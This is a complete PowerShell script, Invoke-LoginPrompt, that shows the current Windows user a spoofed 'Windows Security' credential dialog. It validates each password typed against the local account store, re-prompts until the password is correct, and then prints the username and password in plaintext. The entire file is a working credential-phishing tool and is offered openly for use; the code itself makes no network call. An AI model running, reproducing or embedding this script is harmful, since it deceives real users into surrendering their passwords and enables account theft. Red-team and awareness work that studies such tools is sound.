<#
.SYNOPSIS
Standalone Powershell script that will promp the current user for a valid credentials.

Author: Matt Nelson (@enigma0x3)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION
This script will pop a Windows Authentication box and ask the user for credentials. It will then validate those credentials and continue to ask until proper credentials are supplied.

.LINK
http://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/
#>

Function Invoke-LoginPrompt {
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $InitialPrompt = "Please enter user credentials"
    $RetryPrompt = "Invalid credentials. Please try again"
    $BailOutOnCancel = $True
    $auth = @{ Domain = "$env:userdomain"; UserName = "$env:username"; Password = ""; UserCanceled = $True }
    Do {
        $auth.Password = ""
        $cred = $Host.ui.PromptForCredential("Windows Security", $(If ($cred) {$RetryPrompt} Else {$InitialPrompt}), $(if($auth.Domain) { $("{0}\{1}" -f $auth.Domain, $auth.UserName) } else { $auth.UserName }),"")
        If ($cred) {
            $netcred = $cred.GetNetworkCredential()
            # User/domain selection might have changed, update
            $netcred.PSObject.Properties | ForEach-Object { If ($_.Name -In $auth.Keys) { $auth[$_.Name] = $_.Value } }
        } ElseIf ($BailOutOnCancel) {
            Return New-Object PSObject -Property $auth
        }
        If (-not $auth.Domain) { $auth.Domain = "$env:userdomain" }
    } While($DS.ValidateCredentials($("{0}\{1}" -f $auth.Domain, $auth.UserName), $auth.Password) -ne $True)
    $auth.UserCanceled = $False
    Return New-Object PSObject -Property $auth
}

Write-Host $(Invoke-LoginPrompt)
